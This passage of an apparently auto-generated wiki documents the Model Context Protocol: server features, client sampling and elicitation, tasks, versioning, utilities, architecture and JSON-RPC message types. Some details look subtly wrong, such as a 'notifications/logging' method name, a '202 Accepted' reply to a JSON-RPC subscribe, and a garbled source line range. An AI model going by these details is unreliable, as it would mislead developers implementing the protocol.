    end
```

**Tool Result** [schema/draft/schema.ts]:
- `content`: Array of content blocks (text, image, audio, resource links)
- `isError?`: Whether tool execution failed (default: false)
- `structuredContent?`: Optional structured result object

Sources: [schema/draft/schema.ts]() (tool-related types)

### Resources

Resources are URI-based data that servers expose for clients to read. Clients can subscribe to resource updates.

**Resource Definition**:
- `uri`: Unique URI identifier
- `name`: Display name
- `description?`: Human-readable description
- `mimeType?`: MIME type of resource content
- `annotations?`: Optional metadata

**Resource Access Flow**:

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: resources/list (paginated)
    Server->>Client: list of Resource objects
    
    Client->>Server: resources/read(uri)
    Server->>Client: ReadResourceResult<br/>(contents: TextResourceContents[]<br/>or BlobResourceContents[])
    
    Client->>Server: resources/subscribe(uri)
    Server->>Client: 202 Accepted
    
    Note over Server: Resource changes
    Server->>Client: notifications/resources/updated(uri)
    
    Client->>Server: resources/unsubscribe(uri)
    Server->>Client: 202 Accepted
```

**Resource Content Types**:
- `TextResourceContents`: `{uri, text, mimeType?}`
- `BlobResourceContents`: `{uri, blob (base64), mimeType?}`

Sources: [schema/draft/schema.ts]() (resource-related types)

### Prompts

Prompts are reusable templates that servers expose. Clients can retrieve prompt instances with arguments.

**Prompt Definition**:
- `name`: Unique identifier
- `description?`: Human-readable description
- `arguments?`: Array of prompt arguments with JSON Schema definitions

**Prompt Retrieval Flow**:

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: prompts/list (paginated)
    Server->>Client: list of Prompt objects
    
    Client->>Server: prompts/get(name, arguments?)
    Server->>Client: GetPromptResult<br/>(messages: PromptMessage[],<br/>description?)
```

**Prompt Message**:
- `role`: `"user"` or `"assistant"`
- `content`: Content block (text, image, audio, resource link, embedded resource)

Sources: [schema/draft/schema.ts]() (prompt-related types)

### Logging

Servers can send log messages to clients via `notifications/logging` notifications.

**Log Levels** (syslog severity):
- `"debug"`, `"info"`, `"notice"`, `"warning"`, `"error"`, `"critical"`, `"alert"`, `"emergency"`

**Log Notification**:
```json
{
  "jsonrpc": "2.0",
  "method": "notifications/logging",
  "params": {
    "level": "info",
    "logger": "server-name",
    "data": "Log message text"
  }
}
```

Clients can set the logging level via `logging/setLevel` request.

Sources: [schema/draft/schema.ts]() (logging-related types)

### Completions

Servers can provide argument autocompletion suggestions via `completion/complete` requests.

**Completion Request**:
- `ref`: Reference to a prompt or resource template
- `argument`: Argument name and partial value
- `context?`: Additional context (previously-resolved variables)

**Completion Result**:
- `completion.values`: Array of completion strings (max 100)
- `completion.total?`: Total number of completions available
- `completion.hasMore?`: Whether more completions exist

Sources: [schema/draft/schema.ts]() (completion-related types)

## Client Features

### Sampling (LLM Access)

Servers can request LLM sampling from clients via `sampling/createMessage` requests. This allows servers to leverage AI capabilities without API keys.

**Sampling Request** [docs/specification/draft/client/sampling.mdx]:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "sampling/createMessage",
  "params": {
    "messages": [
      {
        "role": "user",
        "content": {
          "type": "text",
          "text": "What is the capital of France?"
        }
      }
    ],
    "modelPreferences": {
      "hints": [{"name": "claude-3-sonnet"}],
      "costPriority": 0.3,
      "intelligencePriority": 0.8,
      "speedPriority": 0.5
    },
    "temperature": 0.1,
    "systemPrompt": "You are a helpful assistant.",
    "maxTokens": 100
  }
}
```

**Sampling Response**:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "role": "assistant",
    "content": {
      "type": "text",
      "text": "The capital of France is Paris."
    },
    "model": "claude-3-sonnet-20240307",
    "stopReason": "endTurn"
  }
}
```

**Tool Use in Sampling**: Servers can include `tools` array and `toolChoice` to enable LLM tool use:

```json
{
  "tools": [
    {
      "name": "get_weather",
      "description": "Get current weather for a city",
      "inputSchema": {
        "type": "object",
        "properties": {
          "city": {"type": "string"}
        },
        "required": ["city"]
      }
    }
  ],
  "toolChoice": {"mode": "auto"}
}
```

LLM can respond with `ToolUseContent` blocks, which server executes and returns via `ToolResultContent` in next message.

Sources: [docs/specification/draft/client/sampling.mdx](), [schema/draft/schema.ts]() (sampling-related types)

### Elicitation (User Input)

Servers can request user input from clients via `elicitation/create` requests. Two modes supported:

**Form Mode**: In-band structured data collection with JSON Schema validation

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "elicitation/create",
  "params": {
    "mode": "form",
    "message": "Please provide your GitHub username",
    "requestedSchema": {
      "type": "object",
      "properties": {
        "username": {"type": "string"}
      },
      "required": ["username"]
    }
  }
}
```

**URL Mode**: Out-of-band interaction via URL navigation (for sensitive data)

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "elicitation/create",
  "params": {
    "mode": "url",
    "elicitationId": "550e8400-e29b-41d4-a716-446655440000",
    "url": "https://example.com/auth",
    "message": "Please authorize access to your account"
  }
}
```

**Elicitation Response Actions**:
- `action: "accept"`: User approved (form mode includes `content` with data)
- `action: "decline"`: User explicitly declined
- `action: "cancel"`: User dismissed without explicit choice

**URL Elicitation Completion**: Server **MAY** send `notifications/elicitation/complete` when out-of-band interaction finishes.

Sources: [docs/specification/draft/client/elicitation.mdx](), [schema/draft/schema.ts]() (elicitation-related types)

### Roots (Filesystem Boundaries)

Clients can expose filesystem roots (directories) that servers can access. Servers request roots via `roots/list` request.

**Root Definition**:
- `uri`: Directory URI (e.g., `file:///home/user/project`)
- `name`: Display name

**Roots List Flow**:

```mermaid
sequenceDiagram
    participant Server
    participant Client
    
    Server->>Client: roots/list
    Client->>Server: ListRootsResult<br/>(roots: Root[])
    
    Note over Client: Roots change
    Client->>Server: notifications/roots/list_changed
    Server->>Client: (no response)
```

Sources: [schema/draft/schema.ts]() (roots-related types)

## Task System and Async Operations

Tasks enable long-running, durable operations with polling and deferred result retrieval. Introduced in protocol version 2025-11-25 (experimental).

### Task Lifecycle

```mermaid
stateDiagram-v2
    [*] --> working
    
    working --> input_required
    working --> completed
    working --> failed
    working --> cancelled
    
    input_required --> working
    input_required --> completed
    input_required --> failed
    input_required --> cancelled
    
    completed --> [*]
    failed --> [*]
    cancelled --> [*]
```

**Task States**:
- `working`: Task is executing
- `input_required`: Task needs additional input from requestor
- `completed`: Task finished successfully
- `failed`: Task encountered error
- `cancelled`: Task was cancelled

### Task-Augmented Request Flow

```mermaid
sequenceDiagram
    participant Requestor
    participant Receiver
    
    Note over Requestor,Receiver: Create Task
    Requestor->>Receiver: tools/call<br/>(name, arguments, task: {ttl: 60000})
    Receiver->>Requestor: CreateTaskResult<br/>(taskId, status: "working", pollInterval: 5000)
    
    Note over Requestor: Poll for completion
    loop Until terminal status
        Requestor->>Receiver: tasks/get(taskId)
        Receiver->>Requestor: Task (status, lastUpdatedAt, pollInterval)
    end
    
    Note over Requestor: Retrieve result
    Requestor->>Receiver: tasks/result(taskId)
    Receiver->>Requestor: CallToolResult (or error)
    
    Note over Requestor: Optional: List all tasks
    Requestor->>Receiver: tasks/list(cursor?)
    Receiver->>Requestor: ListTasksResult (tasks[], nextCursor?)
    
    Note over Requestor: Optional: Cancel task
    Requestor->>Receiver: tasks/cancel(taskId)
    Receiver->>Requestor: CancelTaskResult (status: "cancelled")
```

**Task Metadata**: All task-related messages include `io.modelcontextprotocol/related-task` in `_meta` field with `taskId`.

**Task Notifications**: Receiver **MAY** send `notifications/tasks/status` when task status changes.

**TTL and Resource Management**:
- Requestor **MAY** specify `ttl` (time-to-live in milliseconds)
- Receiver **MAY** override requested TTL
- After TTL expires, receiver **MAY** delete task and results

Sources: [docs/specification/draft/basic/utilities/tasks.mdx](), [schema/draft/schema.ts]() (task-related types)

## Extensions Framework

Extensions allow optional protocol features beyond core MCP. Declared in capabilities during initialization.

**Extension Declaration**:

```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/apps": {},
      "io.modelcontextprotocol/oauth-client-credentials": {}
    }
  }
}
```

**Official Extensions**:
- `io.modelcontextprotocol/apps`: MCP Apps (interactive UIs)
- `io.modelcontextprotocol/oauth-client-credentials`: OAuth 2.1 client credentials flow

**Extension Naming**: Extensions use reverse-domain naming (e.g., `io.modelcontextprotocol/feature-name`).

Sources: [schema/draft/schema.ts:559-566, 675-683]()

## Protocol Versioning

MCP uses date-based versioning: `YYYY-MM-DD` format.

**Current Versions**:
- `2024-11-05`: Initial release (JSON Schema draft-07)
- `2025-03-26`: Updates (JSON Schema draft-07)
- `2025-06-18`: Updates (JSON Schema draft-07)
- `2025-11-25`: Tasks introduced (JSON Schema 2020-12)
- `draft`: Development version (JSON Schema 2020-12)

**Version Negotiation**:
- Client sends `protocolVersion` in initialize request
- Server responds with chosen `protocolVersion`
- Client **MUST** disconnect if it cannot support server's version

**Backward Compatibility**: Older clients can connect to servers supporting newer versions if server chooses an older protocol version.

Sources: [schema/draft/schema.ts:14](), [docs/specification/draft/changelog.mdx]()

## Utilities

### Progress Notifications

Requestors can request out-of-band progress updates via `progressToken` in `_meta`:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "long_operation",
    "arguments": {},
    "_meta": {
      "progressToken": "progress-123"
    }
  }
}
```

Receiver sends progress updates via `notifications/progress`:

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/progress",
  "params": {
    "progressToken": "progress-123",
    "progress": 50,
    "total": 100,
    "message": "Processing item 50 of 100"
  }
}
```

Sources: [schema/draft/schema.ts:836-870]()

### Cancellation

Either party can cancel in-progress requests via `notifications/cancelled`:

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/cancelled",
  "params": {
    "requestId": "123",
    "reason": "User requested cancellation"
  }
}
```

**Constraints**:
- Cannot cancel `initialize` request
- For task-augmented requests, use `tasks/cancel` instead
- Receiver **SHOULD** stop processing and free resources
- Receiver **MAY** ignore if request already completed

Sources: [docs/specification/draft/basic/utilities/cancellation.mdx](), [schema/draft/schema.ts:341-376]()

### Ping

Either party can send `ping` request to verify connection health:

```json
{
  "jsonrpc": "2.0",
  "id": "123",
  "method": "ping"
}
```

Receiver **MUST** respond promptly with empty result:

```json
{
  "jsonrpc": "2.0",
  "id": "123",
  "result": {}
}
```

Sources: [docs/specification/draft/basic/utilities/ping.mdx](), [schema/draft/schema.ts:809-824]()

## Schema Definition and Generation

The protocol specification is defined in TypeScript source files and automatically generated into JSON Schema and documentation.

**Schema Source** [schema/draft/schema.ts:1-152.84]():
- TypeScript interfaces define all message types
- JSDoc comments provide descriptions
- `@category` tags organize types
- Examples embedded via `@includeCode` directives

**Generated Artifacts**:
- `schema/draft/schema.json`: JSON Schema 2020-12 (machine-readable)
- `docs/specification/draft/schema.mdx`: Generated documentation (human-readable)

**Build Process**:
- `typescript-json-schema` generates JSON Schema from TypeScript
- Custom transformations update `$schema` URL and rename `definitions` to `$defs`
- TypeDoc plugin generates Mintlify-compatible MDX documentation
- Examples validated against generated schemas

Sources: [schema/draft/schema.ts](), [schema/draft/schema.json](), [docs/specification/draft/schema.mdx]()

---

# Page: Architecture and Core Concepts

# Architecture

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/server/prompts.mdx](docs/specification/2025-06-18/server/prompts.mdx)
- [docs/specification/2025-06-18/server/resources.mdx](docs/specification/2025-06-18/server/resources.mdx)
- [docs/specification/2025-06-18/server/tools.mdx](docs/specification/2025-06-18/server/tools.mdx)
- [docs/specification/draft/basic/index.mdx](docs/specification/draft/basic/index.mdx)
- [docs/specification/draft/basic/lifecycle.mdx](docs/specification/draft/basic/lifecycle.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [docs/specification/draft/server/prompts.mdx](docs/specification/draft/server/prompts.mdx)
- [docs/specification/draft/server/resources.mdx](docs/specification/draft/server/resources.mdx)
- [docs/specification/draft/server/tools.mdx](docs/specification/draft/server/tools.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



This document provides a comprehensive technical overview of the Model Context Protocol (MCP) architecture, covering the client-server model, protocol layers, schema-driven design, and transport mechanisms that enable AI applications to integrate with external data sources and tools.

For implementation-specific guidance, see [Server Development](#4). For client ecosystem details, see [Client Ecosystem](#3). For transport protocol specifics, see [Transport Layer](#2.4).

## Overview

MCP implements a schema-driven client-server architecture where AI applications (hosts) establish connections to external services (servers) through dedicated client components. The protocol is built on JSON-RPC 2.0 foundations with a two-layer design: a data layer defining message semantics and primitives, and a transport layer handling message exchange between participants.

The architecture is designed for modularity and extensibility. The TypeScript schema at `schema/draft/schema.ts` serves as the single source of truth, generating both `schema/draft/schema.json` (JSON Schema) and specification documentation. This schema-first approach ensures consistency across multiple language SDKs including TypeScript, Python, Java, C#, Go, Rust, Swift, Ruby, PHP, and Kotlin.

Sources: [schema/draft/schema.ts](), [docs/docs/learn/architecture.mdx:1-26](), [docs.json:1-50]()

## Client-Server Topology

### Participant Roles

MCP defines three key participants in its architecture:

| Participant | Role | Responsibility |
|-------------|------|----------------|
| **MCP Host** | AI application coordinator | Manages multiple MCP clients and orchestrates overall functionality |
| **MCP Client** | Connection manager | Maintains one-to-one connection with a specific MCP server |
| **MCP Server** | Context provider | Exposes tools, resources, and prompts to clients |

### Connection Architecture

**MCP Client-Server Connection Architecture**

```mermaid
graph TB
    subgraph HOST["MCP Host Application"]
        ClaudeDesktop["claude_desktop_config.json<br/>Host Configuration"]
        ClientSession1["Client: ClientSession<br/>Transport: StdioClientTransport"]
        ClientSession2["Client: Client<br/>Transport: HttpClientTransport"] 
        ClientSession3["Client: ClientSession<br/>Transport: StdioClientTransport"]
        
        ClaudeDesktop --> ClientSession1
        ClaudeDesktop --> ClientSession2
        ClaudeDesktop --> ClientSession3
    end
    
    subgraph SERVERS["MCP Server Processes"]
        FilesystemServer["@modelcontextprotocol/server-filesystem<br/>Server: McpServer<br/>Transport: StdioServerTransport"]
        SentryServer["sentry-mcp-server<br/>Server: McpServer<br/>Transport: StreamableHTTPTransport"]
        DatabaseServer["custom-database-server<br/>Server: FastMCP<br/>Transport: StdioServerTransport"]
    end
    
    ClientSession1 ---|"JSON-RPC 2.0 over stdin/stdout"| FilesystemServer
    ClientSession2 ---|"JSON-RPC 2.0 over HTTP POST and SSE"| SentryServer
    ClientSession3 ---|"JSON-RPC 2.0 over stdin/stdout"| DatabaseServer
```

Each MCP client maintains a dedicated one-to-one connection with its corresponding server. This design ensures isolation between different server connections and enables the host to manage multiple context sources independently. The `Client` or `ClientSession` class manages protocol-level communication, while transport classes (`StdioClientTransport`, `HttpClientTransport`) handle the underlying message exchange mechanism.

Sources: [docs/docs/learn/architecture.mdx:28-58](), [docs/docs/develop/build-client.mdx:86-149](), [docs/docs/develop/build-server.mdx:497-512]()

## Protocol Layers

### Data Layer Protocol

The data layer implements JSON-RPC 2.0 based communication with schema-driven message validation. TypeScript definitions in `schema/draft/schema.ts` generate `schema/draft/schema.json` (JSON Schema) for cross-language implementation consistency. The schema defines all request types, result types, notification types, and error codes used in the protocol.

**MCP Protocol Message Architecture**

```mermaid
graph TB
    subgraph SCHEMA["Schema Layer"]
        SchemaTS["schema/draft/schema.ts<br/>TypeScript source of truth"]
        SchemaJSON["schema/draft/schema.json<br/>Generated JSON Schema"]
        ValidationLayer["SDK Validation<br/>zod TypeScript, Pydantic Python"]
    end
    
    subgraph LIFECYCLE["Lifecycle Management"]
        InitializeRequest["InitializeRequest<br/>protocolVersion: 2025-06-18<br/>capabilities: object"]
        InitializeResult["InitializeResult<br/>serverInfo: Implementation<br/>capabilities: ServerCapabilities"]
        InitializedNotification["InitializedNotification<br/>method: notifications/initialized"]
    end
    
    subgraph SERVERFEATURES["Server Primitives"]
        ToolsListRequest["ListToolsRequest<br/>method: tools/list"]
        CallToolRequest["CallToolRequest<br/>method: tools/call<br/>params.name, params.arguments"]
        ListResourcesRequest["ListResourcesRequest<br/>method: resources/list"]
        ReadResourceRequest["ReadResourceRequest<br/>method: resources/read<br/>params.uri"]
        ListPromptsRequest["ListPromptsRequest<br/>method: prompts/list"]
        GetPromptRequest["GetPromptRequest<br/>method: prompts/get<br/>params.name, params.arguments"]
    end
    
    subgraph CLIENTFEATURES["Client Primitives"] 
        CreateMessageRequest["CreateMessageRequest<br/>method: sampling/createMessage<br/>params.messages, params.maxTokens"]
        ListRootsRequest["ListRootsRequest<br/>method: roots/list"]
        CreateElicitationRequest["CreateElicitationRequest<br/>method: elicitation/create"]
    end
    
    SchemaTS --> SchemaJSON
    SchemaJSON --> ValidationLayer
    ValidationLayer --> InitializeRequest
    ValidationLayer --> ToolsListRequest
    ValidationLayer --> CreateMessageRequest
```

Sources: [schema/draft/schema.ts](), [docs/docs/learn/architecture.mdx:79-104](), [docs.json:215-265]()

### Transport Layer

The transport layer abstracts communication details through standardized interfaces, enabling the same protocol implementation across different connection methods:

| Transport | Implementation Classes | Use Case | Message Format | Connection Method |
|-----------|----------------------|----------|----------------|------------------|
| **Stdio** | `StdioServerTransport`, `StdioClientTransport` | Local processes on same machine | JSON-RPC 2.0 over stdin/stdout | Process spawning via `child_process.spawn()` (Node.js) or `subprocess` (Python) |
| **HTTP** | `StreamableHTTPTransport`, `HttpClientTransport` | Remote servers over network | JSON-RPC 2.0 over HTTP POST with SSE streaming | HTTP connections with OAuth 2.1 authorization |

**Transport Implementation Architecture**

```mermaid
graph TB
    subgraph TRANSPORTS["Transport Implementations"]
        StdioServerTransport["StdioServerTransport<br/>Reads from process.stdin<br/>Writes to process.stdout"]
        StdioClientTransport["StdioClientTransport<br/>Uses child_process.spawn<br/>Manages server subprocess"]
        StreamableHTTPTransport["StreamableHTTPTransport<br/>HTTP POST endpoint<br/>SSE for server-to-client"]
        HttpClientTransport["HttpClientTransport<br/>fetch for requests<br/>EventSource for SSE"]
    end
    
    subgraph SESSIONS["Protocol Sessions"] 
        ServerSession["Server: uses session.send_request<br/>Handles incoming via setRequestHandler"]
        ClientSession["Client: uses session.request<br/>Handles responses and notifications"]
    end
    
    subgraph PROTOCOLS["Core Protocol Layer"]
        Protocol["Protocol class<br/>JSON-RPC 2.0 message framing"]
        MessageHandler["Request routing:<br/>tools/list → ListToolsRequestSchema<br/>tools/call → CallToolRequestSchema"]
        ErrorHandler["ErrorCode enum:<br/>ParseError -32700<br/>MethodNotFound -32601"]
    end
    
    StdioServerTransport --> ServerSession
    StdioClientTransport --> ClientSession
    StreamableHTTPTransport --> ServerSession
    HttpClientTransport --> ClientSession
    
    ServerSession --> Protocol
    ClientSession --> Protocol
    Protocol --> MessageHandler
    Protocol --> ErrorHandler
```

Sources: [docs/docs/learn/architecture.mdx:89-98](), [docs/docs/develop/build-client.mdx:126-160](), [docs/docs/develop/build-server.mdx:493-512]()

## Core Primitives

### Server-Exposed Primitives

MCP servers expose three core primitive types through standardized request/response patterns. Each primitive type supports discovery via `*/list` methods and execution/retrieval via specific methods:

**Server Primitive Architecture and Implementation Patterns**

```mermaid
graph TB
    subgraph SERVERPRIMITIVES["Server Primitive Types"]
        Tool["Tool:<br/>name: string<br/>description: string<br/>inputSchema: JSONSchema"]
        Resource["Resource:<br/>uri: string<br/>name: string<br/>mimeType: string"]  
        Prompt["Prompt:<br/>name: string<br/>description: string<br/>arguments: PromptArgument[]"]
    end
    
    subgraph DISCOVERYMETHODS["Discovery Methods"]
        ListToolsRequest["tools/list request<br/>→ ListToolsResult<br/>tools: Tool[]"]
        ListResourcesRequest["resources/list request<br/>→ ListResourcesResult<br/>resources: Resource[]"]
        ListPromptsRequest["prompts/list request<br/>→ ListPromptsResult<br/>prompts: Prompt[]"]
    end
    
    subgraph EXECUTIONMETHODS["Execution/Retrieval Methods"]
        CallToolRequest["tools/call request<br/>params.name: string<br/>params.arguments: object<br/>→ CallToolResult<br/>content: Content[]"]
        ReadResourceRequest["resources/read request<br/>params.uri: string<br/>→ ReadResourceResult<br/>contents: ResourceContents[]"]
        GetPromptRequest["prompts/get request<br/>params.name: string<br/>params.arguments: object<br/>→ GetPromptResult<br/>messages: PromptMessage[]"]
    end
    
    subgraph IMPLEMENTATIONS["SDK Implementation Examples"]
        FastMCP["FastMCP Python:<br/>@mcp.tool decorator<br/>async def get_weather<br/>auto schema from type hints"]
        McpServer["McpServer Java:<br/>@Tool annotation<br/>ToolSpecification class<br/>MethodToolCallbackProvider"]
        TypeScriptSDK["TypeScript SDK:<br/>server.tool method<br/>zod schema parameter<br/>async handler function"]
    end
    
    Tool --> ListToolsRequest
    Resource --> ListResourcesRequest
    Prompt --> ListPromptsRequest
    
    ListToolsRequest --> CallToolRequest
    ListResourcesRequest --> ReadResourceRequest  
    ListPromptsRequest --> GetPromptRequest
    
    CallToolRequest --> FastMCP
    CallToolRequest --> McpServer
    CallToolRequest --> TypeScriptSDK
```

### Client-Exposed Primitives

MCP clients expose primitives that enable servers to request additional capabilities:

| Primitive | Request Method | Purpose | Control Model | Capability Key |
|-----------|---------------|---------|---------------|----------------|
| **Sampling** | `sampling/createMessage` | Request LLM completions with messages and model preferences | Server-initiated, client approves | `capabilities.sampling` |
| **Elicitation** | `elicitation/create` | Request structured user input with schema validation | Server-initiated, user provides data | `capabilities.elicitation` |  
| **Roots** | `roots/list` | Query filesystem access boundaries | Client-managed, server queries | `capabilities.roots` |

Sources: [docs/docs/learn/architecture.mdx:110-133](), [docs/docs/learn/server-concepts.mdx:12-31](), [docs/docs/learn/client-concepts.mdx:10-18](), [schema/draft/schema.ts]()


## Message Flow and Lifecycle

### Initialization Sequence with Capability Negotiation

**MCP Protocol Lifecycle Implementation**

```mermaid
sequenceDiagram
    participant Host as "MCP Host<br/>Claude Desktop"
    participant ClientSession as "Client:<br/>ClientSession with<br/>StdioClientTransport"
    participant ServerProcess as "Server Process:<br/>FastMCP or McpServer with<br/>StdioServerTransport"
    
    Note over Host,ServerProcess: Process Launch and Transport Establishment
    Host->>ClientSession: Load config from<br/>claude_desktop_config.json
    ClientSession->>ServerProcess: Spawn via child_process.spawn<br/>with command and args
    
    Note over ClientSession,ServerProcess: Protocol Version and Capability Negotiation  
    ClientSession->>ServerProcess: initialize request<br/>protocolVersion: "2025-06-18"<br/>capabilities: {elicitation: {}}
    ServerProcess->>ClientSession: initialize result<br/>protocolVersion: "2025-06-18"<br/>serverInfo: {name, version}<br/>capabilities: {tools: {listChanged: true}}
    ClientSession->>ServerProcess: notifications/initialized<br/>no response expected
    
    Note over ClientSession,ServerProcess: Runtime Operations - Tool Discovery
    ClientSession->>ServerProcess: tools/list request
    ServerProcess->>ClientSession: tools/list result<br/>tools: [{name: "get_forecast", inputSchema: {...}}]
    
    Note over ClientSession,ServerProcess: Runtime Operations - Tool Execution
    ClientSession->>ServerProcess: tools/call request<br/>name: "get_forecast"<br/>arguments: {latitude: 37.7749, longitude: -122.4194}
    ServerProcess->>ClientSession: tools/call result<br/>content: [{type: "text", text: "Forecast for..."}]
    
    Note over ClientSession,ServerProcess: Dynamic Updates via Notifications
    ServerProcess->>ClientSession: notifications/tools/list_changed<br/>triggers client to re-query tools/list
```

### Request-Response Patterns

The protocol implements several standardized message exchange patterns defined in the JSON Schema:

1. **Request-Response Pattern**: All method calls use JSON-RPC 2.0 with unique `id` field for correlation. Examples: `tools/list`, `tools/call`, `resources/read`, `prompts/get`
2. **Notification Pattern**: One-way messages without `id` field for events that don't require responses. Examples: `notifications/initialized`, `notifications/tools/list_changed`, `notifications/resources/updated`
3. **Error Responses**: Failed requests return error objects with `code` (integer) and `message` (string) fields instead of result objects

Sources: [docs/docs/learn/architecture.mdx:142-232](), [docs/docs/develop/build-server.mdx:142-194](), [schema/draft/schema.ts]()


## Transport Implementation Details

### Stdio Transport Implementation

Local MCP servers use stdio transport for high-performance, low-latency communication through process pipes:

**Stdio Transport Architecture**

```mermaid
graph TB
    subgraph HOSTPROCESS["Host Process: Claude Desktop"]
        ConfigFile["claude_desktop_config.json<br/>mcpServers configuration"]
        StdioClientTransport["StdioClientTransport class<br/>spawns subprocess via:<br/>child_process.spawn"]
    end
    
    subgraph SERVERPROCESS["Server Process: Python/Node/Java"] 
        StdioServerTransport["StdioServerTransport class<br/>reads from: process.stdin<br/>writes to: process.stdout"]
        ServerImpl["Server implementation:<br/>FastMCP Python<br/>McpServer TypeScript<br/>McpServer Java"]
    end
    
    subgraph COMMUNICATION["Message Communication"]
        JSONRPCMessages["JSON-RPC 2.0 Messages<br/>newline-delimited format"]
        StdinChannel["stdin stream<br/>Client to Server:<br/>requests and notifications"]
        StdoutChannel["stdout stream<br/>Server to Client:<br/>responses and notifications"]
        StderrChannel["stderr stream<br/>Server logging:<br/>never used for protocol"]
    end
    
    ConfigFile --> StdioClientTransport
    StdioClientTransport ---|"spawn command + args"| StdioServerTransport
    StdioServerTransport --> ServerImpl
    
    StdioClientTransport <--> JSONRPCMessages
    StdioServerTransport <--> JSONRPCMessages
    JSONRPCMessages --> StdinChannel
    JSONRPCMessages --> StdoutChannel
    StdioServerTransport -.->|"logging only"| StderrChannel
```

**Key Implementation Characteristics:**
- **Message Framing**: Newline-delimited JSON-RPC 2.0 messages over stdin/stdout
- **Process Management**: Servers launched via `child_process.spawn()` (Node.js) or `subprocess.Popen()` (Python) with configured command and args
- **Error Isolation**: stderr reserved for logging only, never corrupts JSON-RPC message stream
- **Working Directory**: May be undefined (e.g., `/` on macOS), requiring absolute paths in configuration

### HTTP Transport Implementation  

Remote MCP servers use HTTP with Server-Sent Events for web-accessible integration:

- **Client-to-Server Messages**: HTTP POST requests with JSON-RPC 2.0 payload to configured endpoint URL
- **Server-to-Client Messages**: Server-Sent Events (SSE) for streaming responses and notifications
- **Authentication**: OAuth 2.1 authorization framework with bearer tokens in `Authorization` header
- **Session Management**: Can be stateless with token-based auth or stateful with session cookies

**Configuration Examples:**

```json
// claude_desktop_config.json - Stdio Transport
{
  "mcpServers": {
    "weather": {
      "command": "uv",
      "args": ["--directory", "/absolute/path/to/weather", "run", "weather.py"],
      "env": {
        "API_KEY": "secret_key_value"
      }
    }
  }
}
```

```json  
// Custom Connector Configuration - HTTP Transport
{
  "customConnectors": {
    "remote-service": {
      "url": "https://api.service.com/mcp",
      "headers": {
        "Authorization": "Bearer oauth_access_token"
      }
    }
  }
}
```

Sources: [docs/docs/learn/architecture.mdx:89-98](), [docs/docs/develop/build-server.mdx:256-327](), [docs/docs/develop/connect-local-servers.mdx:49-125](), [docs/legacy/tools/debugging.mdx:86-109]()

## Implementation Components

### Core Classes and Interfaces

The MCP architecture is implemented through several key abstractions:

| Component | Purpose | Key Methods |
|-----------|---------|-------------|
| `Protocol` | Message handling | `request()`, `notification()`, `setRequestHandler()` |
| `ClientSession` | Client-side connection | `initialize()`, `list_tools()`, `call_tool()` |
| `ServerSession` | Server-side connection | `send_log_message()`, request handlers |
| `Transport` | Communication layer | `start()`, `send()`, `close()` |

### Error Handling

MCP implements standardized error codes following JSON-RPC 2.0:

```typescript
enum ErrorCode {
  ParseError = -32700,
  InvalidRequest = -32600,
  MethodNotFound = -32601,
  InvalidParams = -32602,
  InternalError = -32603,
}
```

Sources: [docs/legacy/concepts/architecture.mdx:194-207](), [docs/legacy/concepts/architecture.mdx:97-102]()

---

# Page: JSON-RPC Message System

# JSON-RPC Message System

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/basic/index.mdx](docs/specification/2025-06-18/basic/index.mdx)
- [docs/specification/2025-06-18/basic/transports.mdx](docs/specification/2025-06-18/basic/transports.mdx)
- [docs/specification/2025-06-18/basic/utilities/cancellation.mdx](docs/specification/2025-06-18/basic/utilities/cancellation.mdx)
- [docs/specification/2025-06-18/basic/utilities/ping.mdx](docs/specification/2025-06-18/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/transports.mdx](docs/specification/draft/basic/transports.mdx)
- [docs/specification/draft/basic/utilities/cancellation.mdx](docs/specification/draft/basic/utilities/cancellation.mdx)
- [docs/specification/draft/basic/utilities/ping.mdx](docs/specification/draft/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/changelog.mdx](docs/specification/draft/changelog.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

This page documents the JSON-RPC 2.0 message system that forms the foundation of the Model Context Protocol. It covers the structure and semantics of the three core message types (requests, responses, and notifications), error handling, metadata systems, and the ID requirements that enable bidirectional communication between MCP clients and servers.

For information about how messages are transported over the wire, see [Transport Layer](#2.3). For details on how messages are exchanged during connection setup and capability negotiation, see [Connection Lifecycle and Capabilities](#2.4).

## Core Message Types

MCP uses JSON-RPC 2.0 as specified in [https://www.jsonrpc.org/specification](https://www.jsonrpc.org/specification). All messages exchanged between clients and servers **MUST** be valid JSON-RPC 2.0 objects encoded as UTF-8.

The protocol defines three message types, represented by the union type [schema/draft/schema.ts:8-11]():

```
JSONRPCMessage = JSONRPCRequest | JSONRPCNotification | JSONRPCResponse
```

### Requests

A **request** is a message that expects a response. Both clients and servers can send requests to each other, enabling bidirectional communication.

**Structure** [schema/draft/schema.ts:158-161]():

| Field | Type | Required | Description |
|-------|------|----------|-------------|
